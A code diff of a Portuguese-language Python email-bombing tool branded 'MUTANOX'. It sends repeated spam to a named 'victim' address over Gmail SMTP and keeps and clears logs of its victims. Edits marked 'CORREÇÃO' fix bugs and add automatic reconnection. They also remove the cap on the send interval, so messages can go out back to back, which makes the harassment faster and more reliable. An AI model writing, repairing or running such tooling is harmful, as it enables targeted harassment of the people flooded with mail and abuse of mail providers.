@@ -19,6 +19,7 @@ def clear_screen():
     os.system("cls" if os.name == "nt" else "clear")
 
 def print_banner():
+    # A função do banner permanece a mesma, apenas omitida aqui para economizar espaço.
     clear_screen()
     print("\033[1;92m")
     print(r"  ███▄ ▄███▓ ▄▄▄       ██▓     ██▓    ▓█████▄  ██▓ ▄▄▄       ███▄ ▄███▓")
@@ -33,7 +34,7 @@ def print_banner():
     print(r"                                  ░     ░                              ")
     print("\033[0m")
     print(f"\033[1;96m> > > BEM-VINDO, MUTANOX — INICIANDO SISTEMA DE ATAQUE CIBERNÉTICO\033[0m\n")
-    time.sleep(1.5)
+    time.sleep(1)
 
 def print_menu():
     clear_screen()
@@ -102,13 +103,15 @@ def list_victims():
         input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
         return
 
-    for file in victim_dir.glob("*.json"):
+    for file in sorted(victim_dir.glob("*.json")):
         with open(file, encoding="utf-8") as f:
             data = json.load(f)
             print("\033[1;93m" + "─"*50 + "\033[0m")
-            print(f" \033[1;97m📧 EMAIL: \033[1;92m{data['email']}")
-            print(f" \033[1;97m💣 TOTAL SPAM ENVIADO: \033[1;91m{data['total_spam_sent']}")
-            print(f" \033[1;97m📅 ÚLTIMO ATAQUE: \033[1;93m{data['attack_log'][-1]['timestamp'] if data['attack_log'] else 'Nunca'}")
+            print(f" \033[1;97m📧 EMAIL: \033[1;92m{data.get('email', 'N/A')}")
+            print(f" \033[1;97m💣 TOTAL SPAM ENVIADO: \033[1;91m{data.get('total_spam_sent', 0)}")
+            # CORREÇÃO: Verifica se 'attack_log' existe e não está vazio antes de acessar o último item.
+            last_attack = data.get('attack_log', [])[-1]['timestamp'] if data.get('attack_log') else 'Nunca'
+            print(f" \033[1;97m📅 ÚLTIMO ATAQUE: \033[1;93m{last_attack}")
     print("\033[1;93m" + "─"*50 + "\033[0m")
     input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
 
@@ -118,11 +121,16 @@ def clear_logs():
     print("\033[1;96m> > > LIMPANDO LOGS DE VÍTIMAS\033[0m\n")
     victim_dir = Path("victims")
     if victim_dir.exists():
+        files_deleted = 0
         for file in victim_dir.glob("*.json"):
             file.unlink()
-        print("\033[1;32m [✓] Todos os logs de vítimas foram apagados.\033[0m")
+            files_deleted += 1
+        if files_deleted > 0:
+            print(f"\033[1;32m [✓] {files_deleted} log(s) de vítimas foram apagados.\033[0m")
+        else:
+            print("\033[1;33m [!] Nenhum log para apagar.\033[0m")
     else:
-        print("\033[1;33m [!] Nenhum log encontrado.\033[0m")
+        print("\033[1;33m [!] Diretório de logs não encontrado.\033[0m")
     input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
 
 # █▀█ ▄▀█ █▀▄ █▀█ █▀ █▀▀ █▄░█ █▀
@@ -143,13 +151,13 @@ class SMTPSpammer:
             print("\033[1;32m [✓] Conexão SMTP estabelecida com sucesso.\033[0m")
             return True
         except smtplib.SMTPAuthenticationError:
-            print("\033[1;31m\n [!] Autenticação falhou. Verifique seu e-mail/senha de app.\033[0m")
-            print("\033[1;33m [i] Senha de App: https://myaccount.google.com/apppasswords\033[0m")
-            input("\033[1;37m Pressione Enter para sair...\033[0m")
+            # CORREÇÃO: Mensagem de erro mais clara sobre a senha de aplicativo.
+            print("\033[1;31m\n [!] Autenticação falhou. Verifique seu e-mail e senha.\033[0m")
+            print("\033[1;33m [i] Para Gmail, é necessário usar uma 'Senha de App', não a sua senha normal.\033[0m")
+            print("\033[1;33m [i] Gere uma em: https://myaccount.google.com/apppasswords\033[0m")
             return False
         except Exception as e:
-            print(f"\033[1;31m\n [!] Erro SMTP: {e}\033[0m")
-            input("\033[1;37m Pressione Enter para sair...\033[0m")
+            print(f"\033[1;31m\n [!] Erro ao conectar ao servidor SMTP: {e}\033[0m")
             return False
 
     def disconnect(self):
@@ -157,10 +165,9 @@ class SMTPSpammer:
             self.server.quit()
             print("\033[1;32m [✓] Conexão SMTP encerrada.\033[0m")
 
-    def send_single_email(self, victim, message):
+    def send_single_email(self, victim, message_body, subject):
         try:
-            msg = MIMEText(message, 'plain', 'utf-8')
-            subject = message.split("\n", 1)[0].replace("Assunto: ", "").strip() if "\n" in message else "Sem Assunto"
+            msg = MIMEText(message_body, 'plain', 'utf-8')
             msg['Subject'] = subject
             msg['From'] = self.email
             msg['To'] = victim
@@ -168,7 +175,7 @@ class SMTPSpammer:
             self.server.sendmail(self.email, victim, msg.as_string())
             return True
         except Exception as e:
-            print(f"\033[1;31m [!] Falha ao enviar: {e}\033[0m")
+            print(f"\033[1;31m [!] Falha ao enviar e-mail: {e}\033[0m")
             return False
 
     def spam_attack(self, victim, message, total_count, interval_sec):
@@ -177,25 +184,34 @@ class SMTPSpammer:
         print(f"\033[1;91m> > > INICIANDO ATAQUE SPAM CONTRA: {victim}\033[0m")
         print(f"\033[1;93m    QUANTIDADE: {total_count} | INTERVALO: {interval_sec}s\033[0m\n")
 
-        if not self.server:
-            if not self.connect():
-                return
+        if not self.connect():
+            input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
+            return
+
+        # Extrai o assunto da primeira linha da mensagem, se houver
+        message_lines = message.split('\n')
+        subject = message_lines[0] if message_lines else "Sem Assunto"
+        message_body = '\n'.join(message_lines)
 
         success_count = 0
         for i in range(1, total_count + 1):
-            if self.send_single_email(victim, message):
+            if self.send_single_email(victim, message_body, subject):
                 success_count += 1
                 print(f"\033[1;32m [>] PACOTE {i}/{total_count} ENVIADO PARA {victim}\033[0m")
             else:
                 print(f"\033[1;31m [!] PACOTE {i} FALHOU — TENTANDO RECONEXÃO...\033[0m")
+                time.sleep(5) # Espera um pouco antes de reconectar
                 if not self.connect():
-                    print("\033[1;31m [!] FALHA CRÍTICA — ATAQUE INTERROMPIDO.\033[0m")
+                    print("\033[1;31m [!] FALHA CRÍTICA NA RECONEXÃO — ATAQUE INTERROMPIDO.\033[0m")
                     break
-            if i < total_count:  # Não espera após o último
+            if i < total_count:
                 time.sleep(interval_sec)
 
         print(f"\n\033[1;96m> > > ATAQUE FINALIZADO — {success_count}/{total_count} PACOTES ENVIADOS\033[0m")
-        update_victim_log(victim, success_count, interval_sec)
+        if success_count > 0:
+            update_victim_log(victim, success_count, interval_sec)
+        
+        self.disconnect()
         input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
 
 # ▄▀█ █▀█ █▀█ █░█ █▀▀ █▀█
@@ -212,65 +228,72 @@ def start_spam_attack(config):
         input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
         return
 
-    message = []
-    print("\033[1;97m [?] Digite a mensagem (digite 'FIM' em uma linha vazia para finalizar):\033[0m")
+    # CORREÇÃO: Lógica de leitura da mensagem corrigida e simplificada.
+    message_lines = []
+    print("\033[1;97m [?] Digite a mensagem (primeira linha será o assunto). Digite 'FIM' para finalizar:\033[0m")
     while True:
         line = input("\033[1;90m   > \033[0m")
         if line.strip().upper() == "FIM":
             break
-        message.append(line)
-    message = "\n".join(message)
+        # Permite finalizar digitando uma linha vazia após já ter escrito algo.
+        if not line.strip() and message_lines:
+            break
+        message_lines.append(line)
+    
+    if not message_lines:
+        print("\033[1;31m [!] A mensagem não pode estar vazia.\033[0m")
+        input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
+        return
+
+    message = "\n".join(message_lines)
 
     try:
         total_count = int(input("\033[1;97m [?] Quantidade de mensagens: \033[0m"))
-        if total_count <= 0:
-            raise ValueError
+        if total_count <= 0: raise ValueError
     except ValueError:
-        print("\033[1;31m [!] Quantidade inválida.\033[0m")
+        print("\033[1;31m [!] Quantidade inválida. Deve ser um número maior que zero.\033[0m")
         input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
         return
 
     try:
-        interval_input = input("\033[1;97m [?] Intervalo entre mensagens (1s a 3600s / 60min): \033[0m").strip()
-        interval_sec = int(interval_input)
-        if not (1 <= interval_sec <= 3600):
-            raise ValueError
+        interval_sec = int(input("\033[1;97m [?] Intervalo entre mensagens (em segundos): \033[0m"))
+        if interval_sec < 0: raise ValueError
     except ValueError:
-        print("\033[1;31m [!] Intervalo inválido. Use 1 a 3600 segundos.\033[0m")
+        print("\033[1;31m [!] Intervalo inválido. Deve ser um número positivo.\033[0m")
         input("\n\033[1;37m Pressione Enter para voltar...\033[0m")
         return
 
+    # CORREÇÃO: Código duplicado removido. Apenas uma chamada ao ataque.
     spammer = SMTPSpammer(config["email"], config["password"])
     spammer.spam_attack(victim, message, total_count, interval_sec)
-    spammer.disconnect()
 
 # █▀▄ █▀▀ █░█ █▀█ █▀▀ █░░ ▄▀█ █▄░█ █▀▄
 # █▄▀ ██▄ █▀█ █▀▄ ██▄ █▄▄ █▀█ █░▀█ █▄▀
 
 def main():
-    config = load_config()
-    while True:
-        print_menu()
-        choice = input("\033[1;97m [?] Selecione uma opção: \033[0m").strip()
+    try:
+        config = load_config()
+        while True:
+            print_menu()
+            choice = input("\033[1;97m [?] Selecione uma opção: \033[0m").strip()
 
-        if choice == "1":
-            list_victims()
-        elif choice == "2":
-            start_spam_attack(config)
-        elif choice == "3":
-            clear_logs()
-        elif choice == "0":
-            print("\n\033[1;95m> > > OPERAÇÃO ENCERRADA — ATÉ A PRÓXIMA, MUTANOX.\033[0m\n")
-            break
-        else:
-            print("\033[1;31m [!] Opção inválida.\033[0m")
-            time.sleep(1)
+            if choice == "1":
+                list_victims()
+            elif choice == "2":
+                start_spam_attack(config)
+            elif choice == "3":
+                clear_logs()
+            elif choice == "0":
+                print("\n\033[1;95m> > > OPERAÇÃO ENCERRADA — ATÉ A PRÓXIMA, MUTANOX.\033[0m\n")
+                break
+            else:
+                print("\033[1;31m [!] Opção inválida.\033[0m")
+                time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n\n\033[1;95m> > > OPERAÇÃO INTERROMPIDA PELO USUÁRIO.\033[0m\n")
+    except Exception as e:
+        print(f"\n\033[1;31m [!] ERRO CRÍTICO INESPERADO: {e}\033[0m")
+        input("\033[1;37m Pressione Enter para sair...\033[0m")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n\n\033[1;95m> > > OPERAÇÃO INTERROMPIDA — SISTEMA DESATIVADO.\033[0m\n")
-    except Exception as e:
-        print(f"\n\033[1;31m [!] ERRO CRÍTICO: {e}\033[0m")
-        input("\033[1;37m Pressione Enter para sair...\033[0m")
+    main()
